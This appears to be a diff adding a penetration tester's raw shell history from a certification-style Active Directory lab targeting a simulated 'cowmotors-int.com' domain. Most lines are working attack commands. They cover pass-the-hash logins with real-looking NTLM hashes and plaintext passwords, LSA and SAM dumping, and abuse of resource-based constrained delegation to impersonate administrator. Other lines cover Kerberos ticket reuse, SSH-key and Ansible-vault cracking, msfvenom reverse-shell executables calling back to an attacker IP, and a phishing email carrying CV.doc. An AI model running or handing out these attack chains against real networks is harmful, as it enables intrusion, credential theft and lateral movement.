+nxc smb 172.16.231.221 -u John.Forster -H :6388fb0d081f31853aa6debc652397b3
+nxc smb 172.16.231.221 -u John.Forster -H aad3b435b51404eeaad3b435b51404ee:6388fb0d081f31853aa6debc652397b3
+nxc smb 172.16.231.221 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ed24fcb9e3b90bf35eab10161b31c0de
+nxc winrm 172.16.231.221 -u John.Forster -H aad3b435b51404eeaad3b435b51404ee:6388fb0d081f31853aa6debc652397b3\
+
+vim users.txt
+cat user.txt
+cat users.txt
+nxc smb hosts.txt -u users.txt -H aad3b435b51404eeaad3b435b51404ee:ed24fcb9e3b90bf35eab10161b31c0de\
+
+nxc smb hosts.txt -u users.txt -p LhQdARO4yli2
+impacket-smbclient John.Forster:'LhQdARO4yli2'@172.16.231.52 
+ping 172.16.231.221
+gobuster dir -u http://172.16.231.221 -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '403,404' 2>/dev/null\
+
+nxc smb 172.16.231.52 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ed24fcb9e3b90bf35eab10161b31c0de
+nxc smb 172.16.231.52 -u John.Forster -H aad3b435b51404eeaad3b435b51404ee:6388fb0d081f31853aa6debc652397b3
+nxc smb 172.16.231.52 -u John.Forster -p LhQdARO4yli2
+crackmapexec smb 172.16.231.52 -u John.Forster -p LhQdARO4yli2
+crackmapexec smb 172.16.231.52 -u John.Forster -p LhQdARO4yli2 --continue-on-success  --gen-relay-list output.txt
+crackmapexec smb 172.16.231.52 -u John.Forster -p LhQdARO4yli2 --lsa
+crackmapexec smb 172.16.231.52 -u John.Forster -p LhQdARO4yli2 --sam
+sudo ip route add 172.16.231.0/24 dev ligolo\
+
+nxc smb hosts.txt -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ed24fcb9e3b90bf35eab10161b31c0de\
+
+winrm smb hosts.txt -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ed24fcb9e3b90bf35eab10161b31c0de\
+
+nxc winrm 172.16.231.52 -u John.Forster -p LhQdARO4yli2
+nxc winrm hosts.txt -u administrator -H aad3b435b51404eeaad3b435b51404ee:ed24fcb9e3b90bf35eab10161b31c0de
+evil-winrm -i 172.16.231.52 -u administrator -H aad3b435b51404eeaad3b435b51404ee:ed24fcb9e3b90bf35eab10161b31c0de
+evil-winrm -i 172.16.231.52 -u administrator -H :ed24fcb9e3b90bf35eab10161b31c0de
+nxc winrm hosts.txt -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+nxc smb hosts.txt -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+nxc smb hosts.txt -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de -d cowmotors-int.com
+crackmapexec smb hosts.txt -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de -d cowmotors-int.com
+nxc smb 172.16.231.52 -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de -d cowmotors-int.com
+nxc winrm 172.16.231.52 -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+nxc winrm 172.16.231.52 -u client03\administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+nxc smb 172.16.231.52 -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+nxc smb 172.16.231.52 -u .\administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+nxc smb 172.16.231.52 -u Client03\administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+nxc smb 172.16.231.52 -u CLIENT03\administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+crackmapexec smb 172.16.231.52 -u CLIENT03\administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+crackmapexec smb 172.16.231.52 -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de -d .
+nxc smb 172.16.231.52 -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de -d .
+claer
+xfreerdp /cert-ignore  /u:administrator /p:'lab' /v:192.168.231.80 /w:1200 /h:700
+ping  192.168.124.200
+ping  192.168.231.200
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 192.168.231.201 -u "Application - Curriculum Vitae" -m "Attached" -a CV.doc -vvv
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.240 LPORT=443 EXITFUNC=thread -f exe -o shell.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.240 LPORT=443 EXITFUNC=thread -f exe -o shell.exe
+cat log.txt
+sudo ip route add 172.16.205.0/24 dev ligolo
+evil-winrm -i 172.16.205.52 -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de\
+
+xfreerdp /cert-ignore  /u:nicole.lewis /p:'8b1B0BzGvj9J' /v:172.16.205.52 /w:1200 /h:700
+xfreerdp /cert-ignore  /u:offsec /p:'lab' /v:172.16.205.52 /w:1200 /h:700
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+xfreerdp /v:172.16.205.52 /u:administrator /pth:00000000000000000000000000000000:ed24fcb9e3b90bf35eab10161b31c0de
+[200~xfreerdp /v:172.16.205.52 /u:Nicole.Lewis /pth:00000000000000000000000000000000:a022e6da2f2fbf09876dec3a894baee9 
+xfreerdp /v:172.16.205.52 /u:Nicole.Lewis /pth:00000000000000000000000000000000:a022e6da2f2fbf09876dec3a894baee9
+xfreerdp /v:172.16.205.52 /u:Nicole.Lewis /p:8b1B0BzGvj9J
+xfreerdp /v:172.16.205.52 /u:Nicole.Lewis /p:8b1B0BzGvj9J /cert-ignore
+xfreerdp /v:172.16.205.52 /u:offsec /p:Abc123!
+xfreerdp /v:172.16.205.52 /u:cowmotors-int.com/Nicole.Lewis /pth:a022e6da2f2fbf09876dec3a894baee9
+xfreerdp /v:172.16.205.52 /u:cowmotors-int.com/Nicole.Lewis /pth:a022e6da2f2fbf09876dec3a894baee9 /cert:ignore
+xfreerdp /v:172.16.205.52 /u:cowmotors-int.com\Nicole.Lewis /pth:a022e6da2f2fbf09876dec3a894baee9 /cert:ignore\
+
+xfreerdp /v:172.16.205.52 /u:cowmotors-int.com\Nicole.Lewis /pth:a022e6da2f2fbf09876dec3a894baee9 /cert:ignore /sec:rdp
+xfreerdp /v:172.16.205.52 /u:CLIENT03$ /pth:f88b9ce4168b08ad78e77aea57e420c0 /cert:ignore
+xfreerdp /v:172.16.205.52 /u:COWMOTORS-INT\CLIENT03$ /pth:f88b9ce4168b08ad78e77aea57e420c0 /cert:ignore
+xfreerdp /v:<target-ip> /u:COWMOTORS-INT\CLIENT03$ /pth:f88b9ce4168b08ad78e77aea57e420c0 /cert:ignore
+xfreerdp /v:172.16.205.52 /u:COWMOTORS-INT\CLIENT03$ /pth:f88b9ce4168b08ad78e77aea57e420c0 /cert:ignore\
+
+xfreerdp /v:172.16.205.50 /u:administrator /p:Abc123! /cert:ignore\
+
+ping 192.168.205.140\
+
+xfreerdp /cert-ignore  /u:administrator /p:'lab' /v:192.168.205.200 /w:1200 /h:700
+xfreerdp /cert-ignore  /u:administrator /p:'lab' /v:192.168.205.80 /w:1200 /h:700
+cd ~/.ssh/
+cat id_rsa.pub
+ssh root@Dev03
+ssh root@DEV03
+cd OESP
+q
+crackmapexec smb 172.16.205.52 -u "CLIENT03$" -d "COWMOTORS-INT" -H f88b9ce4168b08ad78e77aea57e420c0\
+
+cd ../lab5
+cd ../../lab5
+cd rbcd
+python3 addcomputer.py -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass -dc-ip 172.16.205.101  cowmotors-int.com/Terence.Ford
+python3 rbcd.py -debug -delegate-from 'myComputer$' -delegate-to 'WEB01$' -action write -k -no-pass -dc-ip 172.16.205.101 cowmotors-int.com/Terence.Ford
+python3 rbcd.py -debug -delegate-from 'myComputer$' -delegate-to '172.16.205.221' -action write -k -no-pass -dc-ip 172.16.205.101 cowmotors-int.com/Terence.Ford
+pythpython3 ./rbcd.py -delegate-to WEB01$ -delegate-from myComputer$ -dc-ip 172.16.205.101 -k -no-pass -action write  cowmotors-int.com/Terence.Ford
+python3 ./rbcd.py -delegate-to WEB01$ -delegate-from myComputer$ -dc-ip 172.16.205.101 -k -no-pass -action write  cowmotors-int.com/Terence.Ford\
+
+impacket-psexec -hashes 00000000000000000000000000000000:ed24fcb9e3b90bf35eab10161b31c0de COWMOTORS-INT/administrator@172.16.205.52
+impacket-psexec -hashes 00000000000000000000000000000000:ed24fcb9e3b90bf35eab10161b31c0de administrator@172.16.205.52\
+
+cd lab9
+mkdir client
+mv nlewis ../client/
+mv nlewis.pub ../client/
+cd ../client
+cp ../hosts.txt .
+sudo apt install hydra
+sudo apt upgrade libmongoc-1.0-0
+nxc ssh -h
+nxc ssh --key-file nlewis -u Nicole.Lewis target hosts.txt
+nxc ssh --key-file nlewis -u Nicole.Lewis hosts.txt
+nxc ssh hosts.txt
+nxc ssh hosts.txt --key-file nlewis -u Nicole.Lewis
+nxc ssh -h hosts.txt -u Nicole.Lewis -i nlewis
+nxc ssh hosts.txt -u Nicole.Lewis -i nlewis
+chmod +x spray.sh
+crackmapexec ssh -u Nicole.Lewis -k nlewis -M hosts.txt
+vim spray.sh
+chmod 600 nlewis
+./spray.sh
+ssh -i nlewis nicole.lewis@172.16.205.222
+ssh -i ./nlewis nicole.lewis@172.16.205.224
+ssh nicole.lewis@cowmotors-int.com
+ssh nicole.lewis@cowmotors-int.com@DEV02
+ssh -i ./nlewis nicole.lewis@DEV02
+ssh -i ./nlewis nicole.lewis@172.16.205.222
+ssh -i ./nlewis nicole.lewis@cowmotors-int.com@DEV02
+ssh nicole.lewis@cowmotors-int.com@DEV03
+mkdir web01
+evil-winrm -i 172.16.231.52 -u COWMOTORS-INT\Nicole.Lewis -H a022e6da2f2fbf09876dec3a894baee9\
+
+impacket-psexec -hashes 00000000000000000000000000000000:a022e6da2f2fbf09876dec3a894baee9 COWMOTORS-INT\Nicole.Lewis@172.16.205.52
+impacket-psexec -hashes 00000000000000000000000000000000:a022e6da2f2fbf09876dec3a894baee9 Nicole.Lewis@172.16.205.52
+impacket-psexec -hashes 00000000000000000000000000000000:a022e6da2f2fbf09876dec3a894baee9 cowmotors-int.com/Nicole.Lewis@172.16.205.52
+crackmapexec smb 172.16.205.52 -u cowmotors-int.com/Nicole.Lewis -H a022e6da2f2fbf09876dec3a894baee9\
+
+crackmapexec smb 172.16.205.52 -u cowmotors-int\com/Nicole.Lewis -H a022e6da2f2fbf09876dec3a894baee9\
+
+wmiexec.py cowmotors-int.com/Nicole.Lewis@172.16.205.52 -hashes :a022e6da2f2fbf09876dec3a894baee9
+impacket-wmiexec cowmotors-int.com/Nicole.Lewis@172.16.205.52 -hashes :a022e6da2f2fbf09876dec3a894baee9
+impacket-psexec -hashes 00000000000000000000000000000000:a022e6da2f2fbf09876dec3a894baee9 Nicole.Lewis@172.16.205.52\
+
+impacket-psexec -hashes 00000000000000000000000000000000:6388fb0d081f31853aa6debc652397b3 COWMOTORS-INT/John.Forster@172.16.205.50
+crackmapexec smb 172.16.205.52 -u "cowmotors-int.com\Nicole.Lewis" -H a022e6da2f2fbf09876dec3a894baee9
+nxc smb 172.16.205.52 -u "cowmotors-int.com\Nicole.Lewis" -H a022e6da2f2fbf09876dec3a894baee9
+cat krb5cc_1501201132_LF1ab7
+python3 keytabextract.py krb5cc_1501201132_LF1ab7
+python3 keytabextract.py krb5cc_1501201132_I7xERU
+ticketConverter.py krb5cc_1501201132_LF1ab7 ticket.ccache
+./ticketConverter.py krb5cc_1501201132_LF1ab7 ticket.ccache
+./ticketConverter.py krb5cc_1501201132_LF1ab7 ticket.kirbi
+impacket-getST -spn cifs/web01 -impersonate administrator 'cowmotors-int.com/myComputer$:Abc123!'\
+
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web01/administrator@cifs_web01@COWMOTORS-INT.COM.ccache
+ping COWMOTORS-INT.COM.ccache
+impacket-psexec administrator@cifs_web01@COWMOTORS-INT.COM.ccache -k -no-pass
+impacket-psexec administrator@web01 -k -no-pass
+hydra -h
+hydra -l Nicole.Lewis  -P nlewis -M hosts.txt ssh 
+ping 172.16.205.52
+ssh Nicole.Lewis@cowmotors-int.com@172.16.205.224 
+evil-winrm -i 172.16.205.52 -u nicole.lewis -p 8b1B0BzGvj9J
+ssh -i ./nlewis Nicole.Lewis@cowmotors-int.com@172.16.205.224 
+ssh -i ./nlewis Nicole.Lewis@cowmotors-int.com@DEV02
+ssh2john nlewis > hash
+cd /home/parallels/OSEP/lab3/rockyou.txt .
+john --wordlist=rockyou.txt hash
+ssh -i ./nlewis dev@DEV02
+ssh root@172.16.205.224
+ssh -i ./nlewis dev@DEV02   
+ssh -i ./ansible ansible@DEV03
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web01/krb5cc_1501201132_I7xERU
+impacket-psexec Terence.Ford@COWMOTORS-INT.COM -k -no-pass
+impacket-psexec Terence.Ford@COWMOTORS-INT.COM -k -no-pass 
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web01/krb5cc_1501201114_tAjpy9
+impacket-psexec Nicole.Lewis@COWMOTORS-INT.COM -k -no-pass
+impacket-psexec krbtgt/COWMOTORS-INT.COM@COWMOTORS-INT.COM -k -no-pass\
+
+evil-winrm -i 172.16.205.52 -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+file krb5cc_1501201114_tAjpy9
+kill -9 4491
+cd ls
+ping  192.168.205.201
+evil-winrm -i 172.16.231.52 -u administrator -H ed24fcb9e3b90bf35eab10161b31c0de
+yyy
+chmod 600 nlewis.pub
+chmod 775 nlewis.pub
+ssh  -i nlewis.pub dev@172.16.205.222
+ssh  -i nlewis.pub dev@Dev02
+ssh  -i nlewis.pub dev@cowmotors-int.com@Dev02
+echo 'AAAAB3NzaC1yc2EAAAADAQABAAAAgQCZFXBtEa3QqU38C7OSt+oxQDsgvBhqMhIiytuiko1ktgG9KmhgdEpRWID9/1o2daW8ibDUYpj7YyrQ8RM3F9sX3LE3F3zAmPhWEjum7ORXI0fZNyWEFqbr2Of97UEnqIS7gJzfJ+lh4ma2t1g7iShAHYGvw7J5V8/t6JwXNe3I4Q==' | base64 -d
+python3 /usr/share/john/ansible2john.py ./ansible_enc
+vim testhash.txt
+vim test.yml
+rm ansible_enc
+vim ansible_enc
+ansible2john ansible_enc
+cat testhash.txt
+hashcat testhash.txt --force --hash-type=16900 rockyou.txt
+hashcat testhash.txt --force --hash-type=16900 rockyou.txt --show
+cat ansible_enc
+vim ansible
+chmod 600 ansible
+ssh -i ansible ansible@DEV03
+cd ../web01
+export KRB5CCNAME=/home/parallels/OSEP/lab7/web01/krb5cc_1501201132_LF1ab7
+cp hosts.txt web01
+vim hosts.txt
+nxc smb -M hosts.txt -u Terence.Ford --kerberos\
+
+nxc -hs\
+
+nxc smb -M hosts.txt -u Terence.Ford -k
+nxc smb -m hosts.txt -u Terence.Ford -k
+nxc smb hosts.txt -u Terence.Ford -k
+bloodhound-python -d COWMOTORS-INT.COM -c All -k
+bloodhound-python -d COWMOTORS-INT.COM -u Terence.Ford@COWMOTORS-INT.COM -c  All -k
+bloodhound-python -d COWMOTORS-INT.COM -u Terence.Ford@COWMOTORS-INT.COM -c All -k -dc 172.16.205.101
+bloodhound-python -d COWMOTORS-INT.COM -u Terence.Ford@COWMOTORS-INT.COM -c All -k -ns 172.16.205.101
+ping COWMOTORS-INT.COM
+bloodhound-python -d COWMOTORS-INT.COM -u COWMOTORS-INT.COM\Terence.Ford -c All -k -ns 172.16.205.101
+bloodhound-python -d COWMOTORS-INT.COM -u COWMOTORS-INT\Terence.Ford -c All -k -ns 172.16.205.101
+rm 20250215170747_computers.json 20250215170747_containers.json 20250215170747_domains.json 20250215170747_gpos.json 20250215170747_groups.json 20250215170747_ous.json 20250215170747_users.json 20250215170847_computers.json 20250215170847_containers.json 20250215170847_domains.json 20250215170847_gpos.json 20250215170847_groups.json 20250215170847_ous.json 20250215170847_users.json 
+bloodhound-python -d COWMOTORS-INT.COM -u Terence.Ford -c All -k -ns 172.16.205.101
+ping dev02
+impacket-addcomputer -h
+impacket-addcomputer -method LDAPS -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com -domain-netbios cowmotors-int.com -k\
+
+impacket-addcomputer -method LDAPS -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com -domain-netbios cowmotors-int.com -k -no-pass 
+echo KRB5CCNAME
+echo $KRB5CCNAME
+impacket-addcomputer -method LDAPS -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass \
+
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass  -dc-ip 172.16.205.101   
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass  -dc-ip 172.16.205.101  'cowmotors-int.com/cowmotors-int.com:'\
+
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass  -dc-ip 172.16.205.101  'cowmotors-int.com/cowmotors-int.123com:'\
+
+impacket-addcomputer -method LDAPS -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass  -dc-ip 172.16.205.101  'cowmotors-int.com/cowmotors-int.com:'\
+
+impacket-addcomputer -method LDAP -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass  -dc-ip 172.16.205.101  'cowmotors-int.com/cowmotors-int.com:'\
+
+impacket-addcomputer -method LDAPS -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass  -dc-ip 172.16.205.101  'cowmotors-int.com/Terence.Ford:'
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass -dc-ip 172.16.205.101  'cowmotors-int.com/Terence.Ford:'
+impacket-rbcd -delegate-from 'myComputer$' -delegate-to 'WEB01' -action 'write' -k -no-pass -dc-ip 172.16.205.101
+impacket-rbcd -delegate-from 'myComputer$' -delegate-to 'WEB01' -action 'write' -k -no-pass -dc-ip 172.16.205.101 'cowmotors-int.com/Terence.Ford:'
+ping web01
+impacket-rbcd -delegate-from 'myComputer$' -delegate-to 'WEB01' -action 'write' -k -no-pass -dc-ip 172.16.205.101 -dc-host dc02.cowmotors-int.com 'cowmotors-int.com/Terence.Ford:'\
+
+impacket-rbcd
+impacket-rbcd -use-ldaps -debug -delegate-from 'myComputer$' -delegate-to 'WEB01' -action 'write' -k -no-pass -dc-ip 172.16.205.101 cowmotors-int.com/Terence.Ford:\
+
+impacket-rbcd -use-ldaps -debug -delegate-from 'myComputer$' -delegate-to 'WEB01' -action 'write' -k -no-pass -dc-ip 172.16.205.101 cowmotors-int.com/myComputer$:Abc123!\
+
+impacket-rbcd -use-ldaps -debug -delegate-from 'myComputer$' -delegate-to 'WEB01$' -action 'write' -k -no-pass -dc-ip 172.16.205.101 cowmotors-int.com/Terence:\
+
+impacket-rbcd -use-ldaps -debug -delegate-from 'myComputer$' -delegate-to 'WEB01$' -action write -k -no-pass -dc-ip 172.16.205.101 cowmotors-int.com/Terence
+ping 172.16.205.101
+ping dc02.cowmotors-int.com
+impacket-rbcd -use-ldaps -debug -delegate-from 'myComputer$' -delegate-to 'WEB01$' -action write -k -no-pass cowmotors-int.com/Terence\
+
+impacket-addcomputer -computer-name 'myComputer$' -computer-pass 'Abc123!' -dc-host dc02.cowmotors-int.com  -k -no-pass -dc-ip 172.16.205.101  cowmotors-int.com/Terence.Ford
+nc -zv 172.16.205.101 389
+nslookup dc02.cowmotors-int.com
+sudo ntpdate cowmotors-int.com
+ping cowmotors-int.com
+impacket-rbcd -debug -delegate-from 'myComputer$' -delegate-to 'WEB01$' -action write -k -no-pass cowmotors-int.com/Terence
+cd /home/parallels/OSEP/lab5
+rbcd
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 192.168.205.201 -u "Application - Curriculum Vitae" -m "Attached" -a CV.doc -vvv
+evil-winrm -i 172.16.144.62 -u administrator -H 49180f0b9f2961607ae90ab246e42413
+xfreerdp /cert-ignore  /u:administrator /p:'lab' /v:192.168.144.80 /w:1200 /h:700
+xfreerdp /v:172.16.144.221 /u:administrator /pth:49180f0b9f2961607ae90ab246e42413 /cert-ignore
+[200~pip install 'mssqlpwner@git+https://github.com/ScorpionesLabs/MSSqlPwner.git'
+pip install 'mssqlpwner@git+https://github.com/ScorpionesLabs/MSSqlPwner.git'
+sudo pip install 'mssqlpwner@git+https://github.com/ScorpionesLabs/MSSqlPwner.git'
+nxc mssql 172.16.144.223 -u .\web01$ -H ba3a636ebcaa8fc1752cc4ea4d90645f
+nxc mssql 172.16.144.223 -u web01$ -H ba3a636ebcaa8fc1752cc4ea4d90645f
+nxc mssql 172.16.144.223 -u web01$ -H ba3a636ebcaa8fc1752cc4ea4d90645f -d .
+nxc mssql 172.16.144.223 -u web01$ -H ba3a636ebcaa8fc1752cc4ea4d90645f -d cowmotors-int.com
+nxc mssql 172.16.144.223 -u web01\$ -H ba3a636ebcaa8fc1752cc4ea4d90645f\
+
+nxc mssql -h
+nxc mssql 172.16.144.223 -u web01\$ -H ba3a636ebcaa8fc1752cc4ea4d906--local-auth 
+nxc mssql 172.16.144.223 -u web01\$ -H ba3a636ebcaa8fc1752cc4ea4d906--local-auth nxc mssql 172.16.144.223 -u web01\$ -H ba3a636ebcaa8fc1752cc4ea4d90645f --local-auth
+nxc mssql 172.16.144.223 -u web01\$ -H ba3a636ebcaa8fc1752cc4ea4d90645f --local-auth
+impacket-mssqlclient web01\$@172.16.144.223 -hashes ':ba3a636ebcaa8fc1752cc4ea4d90645f' -windows-auth -k
+cd ~/OSEP/lab7/web
+nxc mssql 172.16.144.223 -u administrator -H 49180f0b9f2961607ae90ab246e42413\
+
+nxc mssql 172.16.144.223 -u administrator -H 49180f0b9f2961607ae90ab246e42413-d .
+nxc mssql 172.16.144.223 -u administrator -H 49180f0b9f2961607ae90ab246e42413
+nxc mssql 172.16.144.223 -u .\administrator -H 49180f0b9f2961607ae90ab246e42413
+sudo ip route add 172.16.144.0/24 dev ligolo
+evil-winrm -i 172.16.144.62 -u administrator -H 49180f0b9f2961607ae90ab246e42413\
+
+ping 172.16.144.62
+nxc smsb 172.16.144.62 
+nxc smb 172.16.144.62 -u administrator -H 49180f0b9f2961607ae90ab246e42413
+evil-winrm -i 172.16.144.223 -u administrator -H 49180f0b9f2961607ae90ab246e42413\
+
+nxc smb 172.16.144.223 -u administrator -H 49180f0b9f2961607ae90ab246e42413\
+
+xfreerdp /v:172.16.144.80 /u:administrator /p:lab /cert-ignore
+xfreerdp /v:192.168.144.80 /u:administrator /p:lab /cert-ignore
+xfreerdp /v:172.16.144.223 /u:Administrator /pth:faf3185b0a608ce2f8afb6f8d133f85b /cert-ignore
+cd OSEP/l
+ping 192.168.144.80
+sudo ifconfig tun0 mtu 1250
+xfreerdp /v:192.168.144.80 /u:Administrator /p:lab /cert-ignore
+impaimpacket-mssqlclient web01\$@172.16.144.223 -hashes '00000000000000000000000000000000:74d72d13c16ade7d649144526253c6bc' -windows-auth
+impacket-mssqlclient web01\$@172.16.144.223 -hashes '00000000000000000000000000000000:3ed15b33f3bcd913e7b7f1143ba1a628' -windows-auth
+impacket-mssqlclient web01\$@172.16.144.223 -hashes ':74d72d13c16ade7d649144526253c6bc'
+impacket-mssqlclient web01\$@172.16.144.223 -hashes ':74d72d13c16ade7d649144526253c6bc' -windows-auth\
+
+evil-winrm -i 172.16.144.221 -u Administrator -H 49180f0b9f2961607ae90ab246e42413
+sudo ip route add 172.16.144.0/24 dev ligolo\
+
+impacket-mssqlclient web01$@172.16.144.223 -hashes ':ba3a636ebcaa8fc1752cc4ea4d90645f' -windows-auth\
+
+impacket-mssqlclient w\eb01$@172.16.144.223 -hashes ':ba3a636ebcaa8fc1752cc4ea4d90645f' -windows-auth\
+
+impacket-mssqlclient web01\$@172.16.144.223 -hashes ':ba3a636ebcaa8fc1752cc4ea4d90645f' -windows-auth\
+
+impacket-mssqlclient web01\$@172.16.144.223 -hashes ':ba3a636ebcaa8fc1752cc4ea4d90645f'
+impacket-mssqlclient web01\$@172.16.144.223 --windows-auth
+nxc mssql 172.16.144.223 -u web01\$ -p OwYb1^T/ VmE*N)E#BP[3_t^P(XP2NuoHm5rRZ`H0ITfhlPZxWtLZ4n9P[wK-TIN/aifT^ZT(V/yD.OyWsKbwRu2mZg!wM/!h'ha03y1w:\Iysh2@B+x --local-auth
+nxc mssql 172.16.144.223 -u web01\$ -p 'OwYb!e[%1^T/ VmE*N)E#BP[3_t^P(XP2NuoHm5rRZ`H0ITfhlPZxWtLZ4n9P[wK-TIN/aifT^ZT(V/yD.OyWsKbwRu2mZg!wM/!h'ha03y1w:\Iysh2@B+x' --local-auth
+nxc mssql 172.16.144.223 -u web01\$ -p "OwYb1^T/ VmE*N)E#BP[3_t^P(XP2NuoHm5rRZ`H0ITfhlPZxWtLZ4n9P[wK-TIN/aifT^ZT(V/yD.OyWsKbwRu2mZg!wM/!h'ha03y1w:\Iysh2@B+x" --local-auth
+impacket-mssqlclient -h
+impacket-mssqlclient web01\$@172.16.144.223 -windows-auth 
+impacket-mssqlclient web01\$@172.16.144.223 -hashes '00000000000000000000000000000000:ba3a636ebcaa8fc1752cc4ea4d90645f' -windows-auth
+impacket-mssqlclient web01\$@172.16.144.223 -hashes '00000000000000000000000000000000:ba3a636ebcaa8fc1752cc4ea4d90645f' -windows-auth\
+
+evil-winrm -i 172.16.144.221 -u administrator -H 49180f0b9f2961607ae90ab246e42413\
+
+impacket-mssqlclient web01\$@172.16.144.223 -windows-auth | echo OwYb1^T/ VmE*N)E#BP[3_t^P(XP2NuoHm5rRZ`H0ITfhlPZxWtLZ4n9P[wK-TIN/aifT^ZT(V/yD.OyWsKbwRu2mZg!wM/!h'ha03y1w:\Iysh2@B+x
+nxc mssql 172.16.144.223 -u web01$ -H ba3a636ebcaa8fc1752cc4ea4d90645f\
+
+find / -name mssqlclient.py
+find / -name mssqlclient.py 2>/dev/null
+cp /usr/share/doc/python3-impacket/examples/mssqlclient.py ~/OSEP/lab7
+python3 mssqlclient.py
+pipx install 'git+https://github.com/ScorpionesLabs/MSSqlPwner.git'\
+
+pip install setuptools
+sudo pip install setuptools
+pip install --upgrade pip setuptools
+mssqlpwner web01\$@172.16.144.223 -windows-auth interactive
+python3 mssqlclient.py web01\$@172.16.144.223 -windows-auth
+wget https://bootstrap.pypa.io/ez_setup.py -O - | python\
+
+sudo apt install python3-distutils
+mssqlpwner -hashes ':ba3a636ebcaa8fc1752cc4ea4d90645f' 'web01\$'@172.16.144.223 -windows-auth interactive
+sudo apt-get install --reinstall python-pkg-resources\
+
+impacket-mssqlclient web01\$@172.16.144.223 -windows-auth
+impacket-mssqlclient db01\$@172.16.144.225 -hashes '00000000000000000000000000000000:0c371e4590ec6e58ea9f9efdb79657cd' -windows-auth
+impacket-mssqlclient db01\$@172.16.144.225 -hashes '00000000000000000000000000000000:675a76f68691ef0b54e789834718a419' -windows-auth
+ping 172.16.144.225
+\
+impacket-mssqlclient DB01\$@172.16.144.225 -windows-auth
+impacket-mssqlclient web01\$@172.16.144.225 -hashes '00000000000000000000000000000000:74d72d13c16ade7d649144526253c6bc' -windows-auth
+impacket-mssqlclient DB01\$@172.16.144.225 -hashes '00000000000000000000000000000000:0c371e4590ec6e58ea9f9efdb79657cd' -windows-auth
+impacket-mssqlclient DB01\$@172.16.144.225 -hashes '00000000000000000000000000000000:675a76f68691ef0b54e789834718a419' -windows-auth\
+
+impacket-mssqlclient Administrator@172.16.144.225 -hashes '00000000000000000000000000000000:faf3185b0a608ce2f8afb6f8d133f85b' -windows-auth
+impacket-mssqlclient Administrator@172.16.144.225 -hashes '00000000000000000000000000000000:faf3185b0a608ce2f8afb6f8d133f85b'
+impacket-mssqlclient DB01\$@172.16.144.225 -hashes '00000000000000000000000000000000:0c371e4590ec6e58ea9f9efdb79657cd' -windows-auth\
+
+impacket-mssqlclient DB01\$@172.16.144.225 -hashes '00000000000000000000000000000000:0c371e4590ec6e58ea9f9efdb79657cd'
+impacket-mssqlclient COWMOTORS-INT\DB01\$@172.16.144.225 -hashes '00000000000000000000000000000000:675a76f68691ef0b54e789834718a419'
+impacket-mssqlclient COWMOTORS-INT\DB01\$@172.16.144.225
+impacket-mssqlclient web01\$@172.16.144.225 -hashes '00000000000000000000000000000000:3ed15b33f3bcd913e7b7f1143ba1a628' -windows-auth
+sendemail -f john@cowmotors-int.com -t jobs@cowmotors-int.com -s 192.168.144.201 -u "Application - Curriculum Vitae" -m "Attached" -a CV.doc -vvv
+sudo ip route add 10.10.104.0/24 dev ligolo2
+ping 10.10.144.10
+sudo nmap -p1-5000 -sT --min-rate=2000 10.10.104.10 -oN nmap-tcp.txt -Pn
+gobuster dir -u http://10.10.104.10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '403,404' 2>/dev/null\
+
+gobuster dir -u http://10.10.10/4.10 -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '403,404' 2>/dev/null\
+
+gobuster dir -u http://10.10.10/4.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b '403,404' 2>/dev/null\
+
+ping http://10.10.104.10/
+sudo apt install wpscan
+impacket-mssqlclient web01\$@172.16.144.223 -hashes '00000000000000000000000000000000:74d72d13c16ade7d649144526253c6bc' -windows-auth
+ping 172.16.144.223
+impacket-mssqlclient web01\$@172.16.144.223 -hashes '00000000000000000000000000000000:74d72d13c16ade7d649144526253c6bc' -windows-auth\
+
